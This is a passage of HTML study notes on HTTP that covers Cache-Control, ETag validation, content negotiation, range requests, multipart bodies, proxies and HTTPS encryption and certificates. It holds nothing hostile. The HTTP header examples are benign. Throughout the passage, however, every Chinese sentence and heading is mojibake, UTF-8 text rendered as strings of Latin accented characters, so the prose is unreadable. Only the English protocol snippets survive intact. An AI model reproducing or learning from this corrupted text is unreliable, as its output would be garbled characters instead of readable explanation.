<li>è®©å®¢æˆ·ç«¯æµè§ˆå™¨è¿›è¡Œç¼“å­˜ã€‚</li>
</ul>
<h3 id="_3-cache-control" tabindex="-1"> 3. Cache-Control</h3>
<p>HTTP/1.1 é€šè¿‡ Cache-Control é¦–éƒ¨å­—æ®µæ¥æ§åˆ¶ç¼“å­˜ã€‚</p>
<p><strong>3.1 ç¦æ­¢è¿›è¡Œç¼“å­˜</strong></p>
<p>no-store æŒ‡ä»¤è§„å®šä¸èƒ½å¯¹è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•ä¸€éƒ¨åˆ†è¿›è¡Œç¼“å­˜ã€‚</p>
<div><pre><code>Cache-Control: no-store
</code></pre></div><p><strong>3.2 å¼ºåˆ¶ç¡®è®¤ç¼“å­˜</strong></p>
<p>no-cache æŒ‡ä»¤è§„å®šç¼“å­˜æœåŠ¡å™¨éœ€è¦å…ˆå‘æºæœåŠ¡å™¨éªŒè¯ç¼“å­˜èµ„æºçš„æœ‰æ•ˆæ€§ï¼Œåªæœ‰å½“ç¼“å­˜èµ„æºæœ‰æ•ˆæ—¶æ‰èƒ½ä½¿ç”¨è¯¥ç¼“å­˜å¯¹å®¢æˆ·ç«¯çš„è¯·æ±‚è¿›è¡Œå“åº”ã€‚</p>
<div><pre><code>Cache-Control: no-cache
</code></pre></div><p><strong>3.3 ç§æœ‰ç¼“å­˜å’Œå…¬å…±ç¼“å­˜</strong></p>
<p>private æŒ‡ä»¤è§„å®šäº†å°†èµ„æºä½œä¸ºç§æœ‰ç¼“å­˜ï¼Œåªèƒ½è¢«å•ç‹¬ç”¨æˆ·ä½¿ç”¨ï¼Œä¸€èˆ¬å­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­ã€‚</p>
<div><pre><code>Cache-Control: private
</code></pre></div><p>public æŒ‡ä»¤è§„å®šäº†å°†èµ„æºä½œä¸ºå…¬å…±ç¼“å­˜ï¼Œå¯ä»¥è¢«å¤šä¸ªç”¨æˆ·ä½¿ç”¨ï¼Œä¸€èˆ¬å­˜å‚¨åœ¨ä»£ç†æœåŠ¡å™¨ä¸­ã€‚</p>
<div><pre><code>Cache-Control: public
</code></pre></div><p><strong>3.4 ç¼“å­˜è¿‡æœŸæœºåˆ¶</strong></p>
<p>max-age æŒ‡ä»¤å‡ºç°åœ¨è¯·æ±‚æŠ¥æ–‡ï¼Œå¹¶ä¸”ç¼“å­˜èµ„æºçš„ç¼“å­˜æ—¶é—´å°äºè¯¥æŒ‡ä»¤æŒ‡å®šçš„æ—¶é—´ï¼Œé‚£ä¹ˆå°±èƒ½æ¥å—è¯¥ç¼“å­˜ã€‚</p>
<p>max-age æŒ‡ä»¤å‡ºç°åœ¨å“åº”æŠ¥æ–‡ï¼Œè¡¨ç¤ºç¼“å­˜èµ„æºåœ¨ç¼“å­˜æœåŠ¡å™¨ä¸­ä¿å­˜çš„æ—¶é—´ã€‚</p>
<div><pre><code>Cache-Control: max-age=31536000
</code></pre></div><p>Expires é¦–éƒ¨å­—æ®µä¹Ÿå¯ä»¥ç”¨äºå‘ŠçŸ¥ç¼“å­˜æœåŠ¡å™¨è¯¥èµ„æºä»€ä¹ˆæ—¶å€™ä¼šè¿‡æœŸã€‚</p>
<div><pre><code>Expires: Wed, 04 Jul 2012 08:26:05 GMT
</code></pre></div><ul>
<li>åœ¨ HTTP/1.1 ä¸­ï¼Œä¼šä¼˜å…ˆå¤„ç† max-age æŒ‡ä»¤ï¼›</li>
<li>åœ¨ HTTP/1.0 ä¸­ï¼Œmax-age æŒ‡ä»¤ä¼šè¢«å¿½ç•¥æ‰ã€‚</li>
</ul>
<h3 id="_4-ç¼“å­˜éªŒè¯" tabindex="-1"> 4. ç¼“å­˜éªŒè¯</h3>
<p>éœ€è¦å…ˆäº†è§£ ETag é¦–éƒ¨å­—æ®µçš„å«ä¹‰ï¼Œå®ƒæ˜¯èµ„æºçš„å”¯ä¸€æ ‡è¯†ã€‚URL ä¸èƒ½å”¯ä¸€è¡¨ç¤ºèµ„æºï¼Œä¾‹å¦‚ <code>http://www.google.com/</code> æœ‰ä¸­æ–‡å’Œè‹±æ–‡ä¸¤ä¸ªèµ„æºï¼Œåªæœ‰ ETag æ‰èƒ½å¯¹è¿™ä¸¤ä¸ªèµ„æºè¿›è¡Œå”¯ä¸€æ ‡è¯†ã€‚</p>
<div><pre><code>ETag: "82e22293907ce725faf67773957acd12"
</code></pre></div><p>å¯ä»¥å°†ç¼“å­˜èµ„æºçš„ ETag å€¼æ”¾å…¥ If-None-Match é¦–éƒ¨ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚åï¼Œåˆ¤æ–­ç¼“å­˜èµ„æºçš„ ETag å€¼å’Œèµ„æºçš„æœ€æ–° ETag å€¼æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™è¡¨ç¤ºç¼“å­˜èµ„æºæœ‰æ•ˆï¼Œè¿”å› 304 Not Modifiedã€‚</p>
<div><pre><code>If-None-Match: "82e22293907ce725faf67773957acd12"
</code></pre></div><p>Last-Modified é¦–éƒ¨å­—æ®µä¹Ÿå¯ä»¥ç”¨äºç¼“å­˜éªŒè¯ï¼Œå®ƒåŒ…å«åœ¨æºæœåŠ¡å™¨å‘é€çš„å“åº”æŠ¥æ–‡ä¸­ï¼ŒæŒ‡ç¤ºæºæœåŠ¡å™¨å¯¹èµ„æºçš„æœ€åä¿®æ”¹æ—¶é—´ã€‚ä½†æ˜¯å®ƒæ˜¯ä¸€ç§å¼±æ ¡éªŒå™¨ï¼Œå› ä¸ºåªèƒ½ç²¾ç¡®åˆ°ä¸€ç§’ï¼Œæ‰€ä»¥å®ƒé€šå¸¸ä½œä¸º ETag çš„å¤‡ç”¨æ–¹æ¡ˆã€‚å¦‚æœå“åº”é¦–éƒ¨å­—æ®µé‡Œå«æœ‰è¿™ä¸ªä¿¡æ¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥åœ¨åç»­çš„è¯·æ±‚ä¸­å¸¦ä¸Š If-Modified-Since æ¥éªŒè¯ç¼“å­˜ã€‚æœåŠ¡å™¨åªåœ¨æ‰€è¯·æ±‚çš„èµ„æºåœ¨ç»™å®šçš„æ—¥æœŸæ—¶é—´ä¹‹åå¯¹å†…å®¹è¿›è¡Œè¿‡ä¿®æ”¹çš„æƒ…å†µä¸‹æ‰ä¼šå°†èµ„æºè¿”å›ï¼ŒçŠ¶æ€ç ä¸º 200 OKã€‚å¦‚æœè¯·æ±‚çš„èµ„æºä»é‚£æ—¶èµ·æœªç»ä¿®æ”¹ï¼Œé‚£ä¹ˆè¿”å›ä¸€ä¸ªä¸å¸¦æœ‰å®ä½“ä¸»ä½“çš„ 304 Not Modified å“åº”æŠ¥æ–‡ã€‚</p>
<div><pre><code>Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
</code></pre></div><div><pre><code>If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
</code></pre></div><h2 id="å†…å®¹åå•†" tabindex="-1"> å†…å®¹åå•†</h2>
<p>é€šè¿‡å†…å®¹åå•†è¿”å›æœ€åˆé€‚çš„å†…å®¹ï¼Œä¾‹å¦‚æ ¹æ®æµè§ˆå™¨çš„é»˜è®¤è¯­è¨€é€‰æ‹©è¿”å›ä¸­æ–‡ç•Œé¢è¿˜æ˜¯è‹±æ–‡ç•Œé¢ã€‚</p>
<h3 id="_1-ç±»å‹" tabindex="-1"> 1. ç±»å‹</h3>
<p><strong>1.1 æœåŠ¡ç«¯é©±åŠ¨å‹</strong></p>
<p>å®¢æˆ·ç«¯è®¾ç½®ç‰¹å®šçš„ HTTP é¦–éƒ¨å­—æ®µï¼Œä¾‹å¦‚ Acceptã€Accept-Charsetã€Accept-Encodingã€Accept-Languageï¼ŒæœåŠ¡å™¨æ ¹æ®è¿™äº›å­—æ®µè¿”å›ç‰¹å®šçš„èµ„æºã€‚</p>
<p>å®ƒå­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ul>
<li>æœåŠ¡å™¨å¾ˆéš¾çŸ¥é“å®¢æˆ·ç«¯æµè§ˆå™¨çš„å…¨éƒ¨ä¿¡æ¯ï¼›</li>
<li>å®¢æˆ·ç«¯æä¾›çš„ä¿¡æ¯ç›¸å½“å†—é•¿ï¼ˆHTTP/2 åè®®çš„é¦–éƒ¨å‹ç¼©æœºåˆ¶ç¼“è§£äº†è¿™ä¸ªé—®é¢˜ï¼‰ï¼Œå¹¶ä¸”å­˜åœ¨éšç§é£é™©ï¼ˆHTTP æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ï¼‰ï¼›</li>
<li>ç»™å®šçš„èµ„æºéœ€è¦è¿”å›ä¸åŒçš„å±•ç°å½¢å¼ï¼Œå…±äº«ç¼“å­˜çš„æ•ˆç‡ä¼šé™ä½ï¼Œè€ŒæœåŠ¡å™¨ç«¯çš„å®ç°ä¼šè¶Šæ¥è¶Šå¤æ‚ã€‚</li>
</ul>
<p><strong>1.2 ä»£ç†é©±åŠ¨å‹</strong></p>
<p>æœåŠ¡å™¨è¿”å› 300 Multiple Choices æˆ–è€… 406 Not Acceptableï¼Œå®¢æˆ·ç«¯ä»ä¸­é€‰å‡ºæœ€åˆé€‚çš„é‚£ä¸ªèµ„æºã€‚</p>
<h3 id="_2-vary" tabindex="-1"> 2. Vary</h3>
<div><pre><code>Vary: Accept-Language
</code></pre></div><p>åœ¨ä½¿ç”¨å†…å®¹åå•†çš„æƒ…å†µä¸‹ï¼Œåªæœ‰å½“ç¼“å­˜æœåŠ¡å™¨ä¸­çš„ç¼“å­˜æ»¡è¶³å†…å®¹åå•†æ¡ä»¶æ—¶ï¼Œæ‰èƒ½ä½¿ç”¨è¯¥ç¼“å­˜ï¼Œå¦åˆ™åº”è¯¥å‘æºæœåŠ¡å™¨è¯·æ±‚è¯¥èµ„æºã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ªåŒ…å« Accept-Language é¦–éƒ¨å­—æ®µçš„è¯·æ±‚ä¹‹åï¼ŒæºæœåŠ¡å™¨è¿”å›çš„å“åº”åŒ…å« <code>Vary: Accept-Language</code> å†…å®¹ï¼Œç¼“å­˜æœåŠ¡å™¨å¯¹è¿™ä¸ªå“åº”è¿›è¡Œç¼“å­˜ä¹‹åï¼Œåœ¨å®¢æˆ·ç«¯ä¸‹ä¸€æ¬¡è®¿é—®åŒä¸€ä¸ª URL èµ„æºï¼Œå¹¶ä¸” Accept-Language ä¸ç¼“å­˜ä¸­çš„å¯¹åº”çš„å€¼ç›¸åŒæ—¶æ‰ä¼šè¿”å›è¯¥ç¼“å­˜ã€‚</p>
<h2 id="å†…å®¹ç¼–ç " tabindex="-1"> å†…å®¹ç¼–ç </h2>
<p>å†…å®¹ç¼–ç å°†å®ä½“ä¸»ä½“è¿›è¡Œå‹ç¼©ï¼Œä»è€Œå‡å°‘ä¼ è¾“çš„æ•°æ®é‡ã€‚</p>
<p>å¸¸ç”¨çš„å†…å®¹ç¼–ç æœ‰ï¼šgzipã€compressã€deflateã€identityã€‚</p>
<p>æµè§ˆå™¨å‘é€ Accept-Encoding é¦–éƒ¨ï¼Œå…¶ä¸­åŒ…å«æœ‰å®ƒæ‰€æ”¯æŒçš„å‹ç¼©ç®—æ³•ï¼Œä»¥åŠå„è‡ªçš„ä¼˜å…ˆçº§ã€‚æœåŠ¡å™¨åˆ™ä»ä¸­é€‰æ‹©ä¸€ç§ï¼Œä½¿ç”¨è¯¥ç®—æ³•å¯¹å“åº”çš„æ¶ˆæ¯ä¸»ä½“è¿›è¡Œå‹ç¼©ï¼Œå¹¶ä¸”å‘é€ Content-Encoding é¦–éƒ¨æ¥å‘ŠçŸ¥æµè§ˆå™¨å®ƒé€‰æ‹©äº†å“ªä¸€ç§ç®—æ³•ã€‚ç”±äºè¯¥å†…å®¹åå•†è¿‡ç¨‹æ˜¯åŸºäºç¼–ç ç±»å‹æ¥é€‰æ‹©èµ„æºçš„å±•ç°å½¢å¼çš„ï¼Œå“åº”æŠ¥æ–‡çš„ Vary é¦–éƒ¨å­—æ®µè‡³å°‘è¦åŒ…å« Content-Encodingã€‚</p>
<h2 id="èŒƒå›´è¯·æ±‚" tabindex="-1"> èŒƒå›´è¯·æ±‚</h2>
<p>å¦‚æœç½‘ç»œå‡ºç°ä¸­æ–­ï¼ŒæœåŠ¡å™¨åªå‘é€äº†ä¸€éƒ¨åˆ†æ•°æ®ï¼ŒèŒƒå›´è¯·æ±‚å¯ä»¥ä½¿å¾—å®¢æˆ·ç«¯åªè¯·æ±‚æœåŠ¡å™¨æœªå‘é€çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œä»è€Œé¿å…æœåŠ¡å™¨é‡æ–°å‘é€æ‰€æœ‰æ•°æ®ã€‚</p>
<h3 id="_1-range" tabindex="-1"> 1. Range</h3>
<p>åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­æ·»åŠ  Range é¦–éƒ¨å­—æ®µæŒ‡å®šè¯·æ±‚çš„èŒƒå›´ã€‚</p>
<div><pre><code>GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
</code></pre></div><p>è¯·æ±‚æˆåŠŸçš„è¯æœåŠ¡å™¨è¿”å›çš„å“åº”åŒ…å« 206 Partial Content çŠ¶æ€ç ã€‚</p>
<div><pre><code>HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)
</code></pre></div><h3 id="_2-accept-ranges" tabindex="-1"> 2. Accept-Ranges</h3>
<p>å“åº”é¦–éƒ¨å­—æ®µ Accept-Ranges ç”¨äºå‘ŠçŸ¥å®¢æˆ·ç«¯æ˜¯å¦èƒ½å¤„ç†èŒƒå›´è¯·æ±‚ï¼Œå¯ä»¥å¤„ç†ä½¿ç”¨ bytesï¼Œå¦åˆ™ä½¿ç”¨ noneã€‚</p>
<div><pre><code>Accept-Ranges: bytes
</code></pre></div><h3 id="_3-å“åº”çŠ¶æ€ç " tabindex="-1"> 3. å“åº”çŠ¶æ€ç </h3>
<ul>
<li>åœ¨è¯·æ±‚æˆåŠŸçš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 206 Partial Content çŠ¶æ€ç ã€‚</li>
<li>åœ¨è¯·æ±‚çš„èŒƒå›´è¶Šç•Œçš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 416 Requested Range Not Satisfiable çŠ¶æ€ç ã€‚</li>
<li>åœ¨ä¸æ”¯æŒèŒƒå›´è¯·æ±‚çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 200 OK çŠ¶æ€ç ã€‚</li>
</ul>
<h2 id="åˆ†å—ä¼ è¾“ç¼–ç " tabindex="-1"> åˆ†å—ä¼ è¾“ç¼–ç </h2>
<p>Chunked Transfer Encodingï¼Œå¯ä»¥æŠŠæ•°æ®åˆ†å‰²æˆå¤šå—ï¼Œè®©æµè§ˆå™¨é€æ­¥æ˜¾ç¤ºé¡µé¢ã€‚</p>
<h2 id="å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ" tabindex="-1"> å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ</h2>
<p>ä¸€ä»½æŠ¥æ–‡ä¸»ä½“å†…å¯å«æœ‰å¤šç§ç±»å‹çš„å®ä½“åŒæ—¶å‘é€ï¼Œæ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨ boundary å­—æ®µå®šä¹‰çš„åˆ†éš”ç¬¦è¿›è¡Œåˆ†éš”ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½å¯ä»¥æœ‰é¦–éƒ¨å­—æ®µã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸Šä¼ å¤šä¸ªè¡¨å•æ—¶å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼ï¼š</p>
<div><pre><code>Content-Type: multipart/form-data; boundary=AaB03x

--AaB03x
Content-Disposition: form-data; name="submit-name"

Larry
--AaB03x
Content-Disposition: form-data; name="files"; filename="file1.txt"
Content-Type: text/plain

... contents of file1.txt ...
--AaB03x--
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="è™šæ‹Ÿä¸»æœº" tabindex="-1"> è™šæ‹Ÿä¸»æœº</h2>
<p>HTTP/1.1 ä½¿ç”¨è™šæ‹Ÿä¸»æœºæŠ€æœ¯ï¼Œä½¿å¾—ä¸€å°æœåŠ¡å™¨æ‹¥æœ‰å¤šä¸ªåŸŸåï¼Œå¹¶ä¸”åœ¨é€»è¾‘ä¸Šå¯ä»¥çœ‹æˆå¤šä¸ªæœåŠ¡å™¨ã€‚</p>
<h2 id="é€šä¿¡æ•°æ®è½¬å‘" tabindex="-1"> é€šä¿¡æ•°æ®è½¬å‘</h2>
<h3 id="_1-ä»£ç†" tabindex="-1"> 1. ä»£ç†</h3>
<p>ä»£ç†æœåŠ¡å™¨æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶ä¸”è½¬å‘ç»™å…¶å®ƒæœåŠ¡å™¨ã€‚</p>
<p>ä½¿ç”¨ä»£ç†çš„ä¸»è¦ç›®çš„æ˜¯ï¼š</p>
<ul>
<li>ç¼“å­˜</li>
<li>è´Ÿè½½å‡è¡¡</li>
<li>ç½‘ç»œè®¿é—®æ§åˆ¶</li>
<li>è®¿é—®æ—¥å¿—è®°å½•</li>
</ul>
<p>ä»£ç†æœåŠ¡å™¨åˆ†ä¸ºæ­£å‘ä»£ç†å’Œåå‘ä»£ç†ä¸¤ç§ï¼š</p>
<ul>
<li>ç”¨æˆ·å¯Ÿè§‰å¾—åˆ°æ­£å‘ä»£ç†çš„å­˜åœ¨ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a314bb79-5b18-4e63-a976-3448bffa6f1b.png" width=""/> </div><br>
<ul>
<li>è€Œåå‘ä»£ç†ä¸€èˆ¬ä½äºå†…éƒ¨ç½‘ç»œä¸­ï¼Œç”¨æˆ·å¯Ÿè§‰ä¸åˆ°ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2d09a847-b854-439c-9198-b29c65810944.png" width=""/> </div><br>
<h3 id="_2-ç½‘å…³" tabindex="-1"> 2. ç½‘å…³</h3>
<p>ä¸ä»£ç†æœåŠ¡å™¨ä¸åŒçš„æ˜¯ï¼Œç½‘å…³æœåŠ¡å™¨ä¼šå°† HTTP è½¬åŒ–ä¸ºå…¶å®ƒåè®®è¿›è¡Œé€šä¿¡ï¼Œä»è€Œè¯·æ±‚å…¶å®ƒé HTTP æœåŠ¡å™¨çš„æœåŠ¡ã€‚</p>
<h3 id="_3-éš§é“" tabindex="-1"> 3. éš§é“</h3>
<p>ä½¿ç”¨ SSL ç­‰åŠ å¯†æ‰‹æ®µï¼Œåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¸€æ¡å®‰å…¨çš„é€šä¿¡çº¿è·¯ã€‚</p>
<h1 id="äº”ã€https" tabindex="-1"> äº”ã€HTTPS</h1>
<p>HTTP æœ‰ä»¥ä¸‹å®‰å…¨æ€§é—®é¢˜ï¼š</p>
<ul>
<li>ä½¿ç”¨æ˜æ–‡è¿›è¡Œé€šä¿¡ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬ï¼›</li>
<li>ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œé€šä¿¡æ–¹çš„èº«ä»½æœ‰å¯èƒ½é­é‡ä¼ªè£…ï¼›</li>
<li>æ— æ³•è¯æ˜æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼ŒæŠ¥æ–‡æœ‰å¯èƒ½é­ç¯¡æ”¹ã€‚</li>
</ul>
<p>HTTPS å¹¶ä¸æ˜¯æ–°åè®®ï¼Œè€Œæ˜¯è®© HTTP å…ˆå’Œ SSLï¼ˆSecure Sockets Layerï¼‰é€šä¿¡ï¼Œå†ç”± SSL å’Œ TCP é€šä¿¡ï¼Œä¹Ÿå°±æ˜¯è¯´ HTTPS ä½¿ç”¨äº†éš§é“è¿›è¡Œé€šä¿¡ã€‚</p>
<p>é€šè¿‡ä½¿ç”¨ SSLï¼ŒHTTPS å…·æœ‰äº†åŠ å¯†ï¼ˆé˜²çªƒå¬ï¼‰ã€è®¤è¯ï¼ˆé˜²ä¼ªè£…ï¼‰å’Œå®Œæ•´æ€§ä¿æŠ¤ï¼ˆé˜²ç¯¡æ”¹ï¼‰ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ssl-offloading.jpg" width="700"/> </div><br>
<h2 id="åŠ å¯†" tabindex="-1"> åŠ å¯†</h2>
<h3 id="_1-å¯¹ç§°å¯†é’¥åŠ å¯†" tabindex="-1"> 1. å¯¹ç§°å¯†é’¥åŠ å¯†</h3>
<p>å¯¹ç§°å¯†é’¥åŠ å¯†ï¼ˆSymmetric-Key Encryptionï¼‰ï¼ŒåŠ å¯†å’Œè§£å¯†ä½¿ç”¨åŒä¸€å¯†é’¥ã€‚</p>
<ul>
<li>ä¼˜ç‚¹ï¼šè¿ç®—é€Ÿåº¦å¿«ï¼›</li>
<li>ç¼ºç‚¹ï¼šæ— æ³•å®‰å…¨åœ°å°†å¯†é’¥ä¼ è¾“ç»™é€šä¿¡æ–¹ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7fffa4b8-b36d-471f-ad0c-a88ee763bb76.png" width="600"/> </div><br>
<h3 id="_2-éå¯¹ç§°å¯†é’¥åŠ å¯†" tabindex="-1"> 2. éå¯¹ç§°å¯†é’¥åŠ å¯†</h3>
<p>éå¯¹ç§°å¯†é’¥åŠ å¯†ï¼Œåˆç§°å…¬å¼€å¯†é’¥åŠ å¯†ï¼ˆPublic-Key Encryptionï¼‰ï¼ŒåŠ å¯†å’Œè§£å¯†ä½¿ç”¨ä¸åŒçš„å¯†é’¥ã€‚</p>
<p>å…¬å¼€å¯†é’¥æ‰€æœ‰äººéƒ½å¯ä»¥è·å¾—ï¼Œé€šä¿¡å‘é€æ–¹è·å¾—æ¥æ”¶æ–¹çš„å…¬å¼€å¯†é’¥ä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œæ¥æ”¶æ–¹æ”¶åˆ°é€šä¿¡å†…å®¹åä½¿ç”¨ç§æœ‰å¯†é’¥è§£å¯†ã€‚</p>
<p>éå¯¹ç§°å¯†é’¥é™¤äº†ç”¨æ¥åŠ å¯†ï¼Œè¿˜å¯ä»¥ç”¨æ¥è¿›è¡Œç­¾åã€‚å› ä¸ºç§æœ‰å¯†é’¥æ— æ³•è¢«å…¶ä»–äººè·å–ï¼Œå› æ­¤é€šä¿¡å‘é€æ–¹ä½¿ç”¨å…¶ç§æœ‰å¯†é’¥è¿›è¡Œç­¾åï¼Œé€šä¿¡æ¥æ”¶æ–¹ä½¿ç”¨å‘é€æ–¹çš„å…¬å¼€å¯†é’¥å¯¹ç­¾åè¿›è¡Œè§£å¯†ï¼Œå°±èƒ½åˆ¤æ–­è¿™ä¸ªç­¾åæ˜¯å¦æ­£ç¡®ã€‚</p>
<ul>
<li>ä¼˜ç‚¹ï¼šå¯ä»¥æ›´å®‰å…¨åœ°å°†å…¬å¼€å¯†é’¥ä¼ è¾“ç»™é€šä¿¡å‘é€æ–¹ï¼›</li>
<li>ç¼ºç‚¹ï¼šè¿ç®—é€Ÿåº¦æ…¢ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/39ccb299-ee99-4dd1-b8b4-2f9ec9495cb4.png" width="600"/> </div><br>
<h3 id="_3-https-é‡‡ç”¨çš„åŠ å¯†æ–¹å¼" tabindex="-1"> 3. HTTPS é‡‡ç”¨çš„åŠ å¯†æ–¹å¼</h3>
<p>HTTPS é‡‡ç”¨æ··åˆçš„åŠ å¯†æœºåˆ¶ï¼Œä½¿ç”¨éå¯¹ç§°å¯†é’¥åŠ å¯†ç”¨äºä¼ è¾“å¯¹ç§°å¯†é’¥æ¥ä¿è¯ä¼ è¾“è¿‡ç¨‹çš„å®‰å…¨æ€§ï¼Œä¹‹åä½¿ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†è¿›è¡Œé€šä¿¡æ¥ä¿è¯é€šä¿¡è¿‡ç¨‹çš„æ•ˆç‡ã€‚ï¼ˆä¸‹å›¾ä¸­çš„ Session Key å°±æ˜¯å¯¹ç§°å¯†é’¥ï¼‰</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/How-HTTPS-Works.png" width="600"/> </div><br>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-28-15-17-29.png" alt="" loading="lazy"></p>
<h2 id="è®¤è¯" tabindex="-1"> è®¤è¯</h2>
<p>é€šè¿‡ä½¿ç”¨  <strong>è¯ä¹¦</strong>  æ¥å¯¹é€šä¿¡æ–¹è¿›è¡Œè®¤è¯ã€‚</p>
<p>æ•°å­—è¯ä¹¦è®¤è¯æœºæ„ï¼ˆCAï¼ŒCertificate Authorityï¼‰æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨åŒæ–¹éƒ½å¯ä¿¡èµ–çš„ç¬¬ä¸‰æ–¹æœºæ„ã€‚</p>
<p>æœåŠ¡å™¨çš„è¿è¥äººå‘˜å‘ CA æå‡ºå…¬å¼€å¯†é’¥çš„ç”³è¯·ï¼ŒCA åœ¨åˆ¤æ˜æå‡ºç”³è¯·è€…çš„èº«ä»½ä¹‹åï¼Œä¼šå¯¹å·²ç”³è¯·çš„å…¬å¼€å¯†é’¥åšæ•°å­—ç­¾åï¼Œç„¶ååˆ†é…è¿™ä¸ªå·²ç­¾åçš„å…¬å¼€å¯†é’¥ï¼Œå¹¶å°†è¯¥å…¬å¼€å¯†é’¥æ”¾å…¥å…¬å¼€å¯†é’¥è¯ä¹¦åç»‘å®šåœ¨ä¸€èµ·ã€‚</p>
<p>è¿›è¡Œ HTTPS é€šä¿¡æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠŠè¯ä¹¦å‘é€ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å–å¾—å…¶ä¸­çš„å…¬å¼€å¯†é’¥ä¹‹åï¼Œå…ˆä½¿ç”¨æ•°å­—ç­¾åè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œå°±å¯ä»¥å¼€å§‹é€šä¿¡äº†ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2017-06-11-ca.png" width=""/> </div><br>
<h2 id="å®Œæ•´æ€§ä¿æŠ¤" tabindex="-1"> å®Œæ•´æ€§ä¿æŠ¤</h2>
<p>SSL æä¾›æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½æ¥è¿›è¡Œå®Œæ•´æ€§ä¿æŠ¤ã€‚</p>
<p>HTTP ä¹Ÿæä¾›äº† MD5 æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½ï¼Œä½†ä¸æ˜¯å®‰å…¨çš„ã€‚ä¾‹å¦‚æŠ¥æ–‡å†…å®¹è¢«ç¯¡æ”¹ä¹‹åï¼ŒåŒæ—¶é‡æ–°è®¡ç®— MD5 çš„å€¼ï¼Œé€šä¿¡æ¥æ”¶æ–¹æ˜¯æ— æ³•æ„è¯†åˆ°å‘ç”Ÿäº†ç¯¡æ”¹ã€‚</p>
<p>HTTPS çš„æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½ä¹‹æ‰€ä»¥å®‰å…¨ï¼Œæ˜¯å› ä¸ºå®ƒç»“åˆäº†åŠ å¯†å’Œè®¤è¯è¿™ä¸¤ä¸ªæ“ä½œã€‚è¯•æƒ³ä¸€ä¸‹ï¼ŒåŠ å¯†ä¹‹åçš„æŠ¥æ–‡ï¼Œé­åˆ°ç¯¡æ”¹ä¹‹åï¼Œä¹Ÿå¾ˆéš¾é‡æ–°è®¡ç®—æŠ¥æ–‡æ‘˜è¦ï¼Œå› ä¸ºæ— æ³•è½»æ˜“è·å–æ˜æ–‡ã€‚</p>
<h2 id="https-çš„ç¼ºç‚¹" tabindex="-1"> HTTPS çš„ç¼ºç‚¹</h2>
<ul>
<li>å› ä¸ºéœ€è¦è¿›è¡ŒåŠ å¯†è§£å¯†ç­‰è¿‡ç¨‹ï¼Œå› æ­¤é€Ÿåº¦ä¼šæ›´æ…¢ï¼›</li>
<li>éœ€è¦æ”¯ä»˜è¯ä¹¦æˆæƒçš„é«˜é¢è´¹ç”¨ã€‚</li>
</ul>
<h1 id="å…­ã€http-1-1-æ–°ç‰¹æ€§" tabindex="-1"> å…­ã€HTTP/1.1 æ–°ç‰¹æ€§</h1>
<p>è¯¦ç»†å†…å®¹è¯·è§ä¸Šæ–‡</p>
<ul>
<li>é»˜è®¤æ˜¯é•¿è¿æ¥</li>
<li>æ”¯æŒæµæ°´çº¿</li>
<li>æ”¯æŒåŒæ—¶æ‰“å¼€å¤šä¸ª TCP è¿æ¥</li>
<li>æ”¯æŒè™šæ‹Ÿä¸»æœº</li>
